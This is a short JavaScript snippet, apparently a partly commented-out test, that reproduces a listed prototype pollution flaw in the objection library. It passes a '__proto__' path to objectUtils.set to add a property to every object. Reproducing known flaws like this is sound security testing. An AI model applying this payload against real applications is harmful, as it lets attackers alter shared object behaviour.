// //https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
// test("prototype pollution in objection", () => {
  const objectUtils = require("objection/lib/utils/objectUtils");

console.log({}.polluted);

  let obj = {};
  //objectUtils.set(obj, ["constructor", "prototype", "polluted"], "yes");
  objectUtils.set(obj, ["__proto__", "polluted"], "yes");

console.log({}.polluted);
// });
